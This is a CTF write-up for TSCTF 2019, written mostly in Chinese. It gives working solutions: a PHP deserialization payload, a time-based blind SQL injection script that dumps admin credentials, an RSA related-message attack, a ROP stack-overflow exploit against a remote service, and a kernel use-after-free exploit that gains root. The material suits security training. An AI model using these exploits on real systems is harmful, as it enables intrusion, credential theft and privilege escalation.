# TSCTF 2019 - test

## WEB

### Object?

https://www.vulnspy.com/cn-ripstech-presents-php-security-calendar-2017/

```
a:2:{s:4:"name";s:1:"a";i:0;O:%2B7:"BlogLog":1:{s:4:"log_";s:5:"/flag";}}
```

### Ozone!
搜索hint得到源码

member.php存在注入

网上找了个脚本修改一下得到md5的password

    #coding: utf-8
    
    
    
    import requests
    
    from base64 import b64encode
    
    def sendHead(url,header,cookie,errNum=0):
    
        maxErr=5
    
        try:
    
            result=requests.get(url,headers=header,cookies=cookie,timeout=15)
    
        except requests.HTTPError as e:
    
            if errNum>maxErr:
    
                print(e)
    
                return None
    
            else:
    
                errNum=errNum+1
    
                sendHead(url,header,cookie,errNum)
    
        except requests.Timeout as e:
    
            if errNum>maxErr:
    
                print(e)
    
                return None
    
            else:
    
                errNum=errNum+1
    
                sendHead(url,header,cookie,errNum)
    
        except requests.ReadTimeout as e :
    
            if errNum>maxErr:
    
                print(e)
    
                return None
    
            else:
    
                errNum=errNum+1
    
                sendHead(url,header,cookie,errNum)
    
        except requests.ConnectionError as e :
    
            if errNum>maxErr:
    
                print(e)
    
                return None
    
            else:
    
                errNum=errNum+1
    
                sendHead(url,header,cookie,errNum)
    
        except requests.ConnectTimeout as e :
    
            if errNum>maxErr:
    
                print(e)
    
                return None
    
            else:
    
                errNum=errNum+1
    
                sendHead(url,header,cookie,errNum)
    
        return result
    
    myHeaders = {
    
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0"
    
    }
    
    url = "http://10.104.252.147/admin/login.php"
    ss = "{}_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-+"
    def getPass(option):
    
        tmp=""
    
        xxoo=0
    
        for x in range(1,50):
    
            print(x)
    
            for i in ss:
    
                #poc="' or substr({0},{1},1)='{2}' and sleep(6) #".format(option,x,chr(i))
                #poc = "' or (substr((select binary SCHEMA_NAME from information_schema.SCHEMATA limit 1,1),{0},1)='{1}') and sleep(6)#".format(x,i)
                #tsctf
                #poc = "' or (substr((select binary group_concat(table_NAME) from information_schema.tables where TABLE_SCHEMA='tsctf' limit 0,1),{0},1)='{1}') and sleep(6)#".format(x,i)
                #fish_adminfish_ipfish_user
                #poc = "' or (substr((select binary password from fish_admin limit 1),{0},1)='{1}') and sleep(6)#".format(x,i)
                #eff6e58bce4697661a82f733998c28a0
                #EFF6E58BCE4697661A82F733998C28A0
                poc = "' or (substr((select binary username from fish_admin limit 1),{0},1)='{1}') and sleep(6)#".format(x,i)
                myCookies={
    
                    "islogin":"1",
    
                    "admin_user":b64encode(poc)
    
                }
    
                result=sendHead(url,myHeaders,myCookies)
    
                if result==None:
    
                    print(poc)
    
                    exit()
    
                else:
    
                    date=result.elapsed.total_seconds()
    
                    if date>=0.6:
    
                        if(sendHead(url,myHeaders,myCookies).elapsed.total_seconds()>1.2):
    
                            tmp=tmp+i
    
                            print(poc)
    
                            print(tmp)
    
                            strNone = False
    
                            continue
    
                    else:
    
                        strNone=True
    
    
    def main():
    
        getPass("password")
    
        getPass("username")
    
    
    
    if __name__ == '__main__':
    
        main()

把eff6e58bce4697661a82f733998c28a0abchdbb768526 sha1一下

修改cookie进入后台拿到flag


```
dc6a6d0abb563785a038e953daa5550c6278f595
```

## Crypto

### ez_rsa

`e = 3`

http://lanvnal.com/2018/07/28/RSA%E9%A2%98%E5%9E%8B%E6%80%BB%E7%BB%93/index.html#Related-Message-Attack

```python
import gmpy2
padding1 = 1
padding2 = 2
c1 = 4040550759126551313127879899636800199760099979602512807721308942907341737372598965845061817542066386883548650528800590184849063222814847616775093607912296776910611548617926452368984712709207677690086929507386042989029946646029338163290803740106292763766434399010095548946718213064144700810417004164919803086861110564368795838107661511694650064540241622346712281722445550363971775072058015325642930180669080385296874194954513847170979103389831043003949187494099532705849624009592290069779296639733327186113928271903897128934166054917741397338706114735465818164946208334363904512162189509324228571908578082538873506224
c2 = 4040550759126551313127879899636800199760099979602512807721308942907341737372598965845061817542066386883548650528800590184849063222814847616775093607912296776910611548620713793393742131697597021000121588789548380208470833871131571472102397693877351084300317267524596274165059291707918830306856672426596908657961298632954906754012002586982075550049230547736251417594462552852161838401584200909021493166001060220102251258554222090944046085140724432388604586777229389265554023896883837281355657435827125066245856919913434692236750355846491785345707967523143293119108175714446663836930511150337474289868356329463188216785
n = 15140693307781575272905350127561480454925382248795401006625344434130151846159152971573000556723863453355181533147841646458143380103726586571049885350673144089829068009655419999239385581818120152814330978257677531674973337312840399216471492585834737174518293085143844527211526737653844651552314020009101138118532093970566042720563471752966826492765420192021844395106141004313477990385827147980290701501857295050930728740995972148940052482089846995233018778559881494686891833098312466976990249602655019736515270250381315543985877162881197770970391243217647571088328005066371951384078096064640638774932935204127654713461
a = 1
b = padding1 - padding2
def getmessage(a, b, c1, c2, n):
    b3 = gmpy2.powmod(b, 3, n)
    part1 = b * (c1 + 2 * c2 - b3) % n
    part2 = a * (c1 - c2 + 2 * b3) % n
    part2 = gmpy2.invert(part2, n)
    return part1 * part2 % n
message = getmessage(a, b, c1, c2, n) - padding2
message = hex(message)[2:]
if len(message) % 2 != 0:
    message = '0' + message
print (bytes.fromhex(message))
```
## RE
### checkin
题目是一个循环右移加密

脚本如下
```
s=[0xBE,0x5F,0xE8,0xC9,0x0B,0x45,0x6E,0xD7,0x99,0x6D,0x80,0x1D,0xDB,0x64,0x8A,0xD0,0xA9,0x54]
n=17 % 8 
for i in s:
	a=str(bin(i)[2:])
	while (len(a)!=8):
		a="0"+a
	#print a
	a=a[n:]+a[:n]
	n-=1
	if (n==-1):
		n=7
	print a

ans="}_traTs_3m@G{FTCST"
print ans[::-1]
```

## PWN
### nofile

直接栈溢出泄露地址，调用`setrlimit`设置`rlimit`结构体为原本的`p64(0x400),p64(0x100000)`即可调用`vul_func`打开flag
```python=
from pwn import *

context.update(arch='amd64', os='linux')

canary = 0
leak_addr = 0
vul_func = 0xc13
main_addr = 0xcb5
pop_rdi = 0xde3
pop_rsi_r15 = 0xde1
stack_addr = 0

def leak(p, size=8*8):
    global pop_rdi
    global vul_func
    global canary
    global leak_addr
    global main_addr
    global stack_addr
    global pop_rsi_r15
    p.sendlineafter('2,3or4?', str(0x18))
    p.sendafter('your Name?', 'a'*0x19)
    p.recvline()
    p.recv(0x19)
    #print repr(p.recv(7))
    #print repr(p.recv(8))
    canary = u64('\x00' + p.recv(7))
    leak_addr = u64(p.recv(6).ljust(8, '\x00')) & 0xfffffffffff000
    print hex(leak_addr)
    vul_func += leak_addr
    main_addr += leak_addr
    pop_rdi += leak_addr
    pop_rsi_r15 += leak_addr
    p.recvuntil(', Right?')
    print hex(vul_func)
    print hex(canary)

def leak_2(p):
    global stack_addr
    p.sendlineafter('2,3or4?', str(0x30-1))
    p.sendafter('your Name?', 0x30*'a')
    p.recvline()
    #print p.recvuntil('Right')
    p.recv(0x30)
    stack_addr = u64(p.recv(6).ljust(8, '\x00')) - 0x100
    print hex(stack_addr)
    p.recvuntil(', Right?')


def pwn():
    global canary
    global leak_addr
    global stack_addr
    global main_addr
    global pop_rdi
    p = remote('10.112.100.47', 6135)
    #p = process('./nofile', aslr=False)
    if 0:
        gdb.attach(p, '''
                b *0x555555554b36
                b *0x555555554ce6
                b *0x555555554c94
                b *0x555555554cfe
                b *0x555555554d08
                b *0x555555554d61
                b *0x555555554d7b
                b *0x555555554950
                c
                ''')
    pause()
    leak(p)
    p.send('n')
    p.sendlineafter('So the Length?', str(0x30-1))
    payload = '\x00' * 0x18 + p64(canary) + '\x00'*8 + p64(leak_addr + 0xc94)
    #print payload.encode('hex')
    p.sendafter('your Name?', payload)
    leak_2(p)
    p.send('n')
    p.sendlineafter('So the Length?', str(0xA0-1))
    print 'stack:',hex(stack_addr)
    #pop_6 = leak_addr + 0xdda
    #pop_rsp = leak_addr + 0xddd
    setrlimit = leak_addr + 0x950
    getrlimit = leak_addr + 0x970
    read_addr = leak_addr + 0xb66
    bss = 0x202020 + leak_addr
    payload = p64(0) + p64(0x100000) + 'a'*0x8 + p64(canary) + p64(stack_addr) + p64(pop_rsi_r15) + p64(stack_addr) + p64(0)
    payload += p64(pop_rdi) + p64(0x10 + 4) + p64(read_addr) + p64(pop_rdi) + p64(7)
    payload += p64(pop_rsi_r15) + p64(stack_addr) + p64(0) + p64(setrlimit) + p64(pop_rdi) + p64(stack_addr + 0x10) + p64(vul_func)

    p.sendafter('your Name?', payload)
    p.send(p64(0x400) + p64(0x100000) + 'flag\x00')

    p.interactive()



if __name__ == '__main__':
    pwn()

```

### babykernel


虽然比赛的时间内没做完，但还是写在这里吧。。。。


`kfree`之后指针未清空，`cred`大小和`kmem_cache_alloc`申请的slab缓存大小一致，直接UAF之后再次申请`cred`所在堆块就会自动初始化id位，执行命令即可。
```cpp
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define DEL 		0x2766
#define SET_ZEGE 	0x22B8  // 0x123456789ABCDEF0LL
#define ALLOC 		0x271A
#define SET_JIGE 	0x1A0A  // 0xFEDCBA987654321LL


int main() {
    int fd = open("/dev/tshop", 0);
    size_t heap_addr , kernel_addr,mod_addr;
    if (fd < 0) {
        printf("[-] bad open /dev/tshop\n");
        exit(-1);
    }

    ioctl(fd, ALLOC, 0);
    ioctl(fd, ALLOC, 1);
    ioctl(fd, DEL, 0);
    ioctl(fd, DEL, 1);
    int pid=fork();
    ioctl(fd, DEL, 1);
    ioctl(fd, ALLOC, 3);
    //getchar();
    //getchar();
    if (pid < 0) {
        puts("[-] fork error!");
        exit(0);
    } else if (pid == 0) {
        if (getuid() == 0) {
            puts("[+] root");
            system("cat /home/sunichi/flag");
            system("id");
            exit(0);
        }
    }
}

//TSCTF{S0_4a5y_k4rNel_pWn_6ut_JiGe_AND_Zege_g1Ve_Y0u_fl4g}
```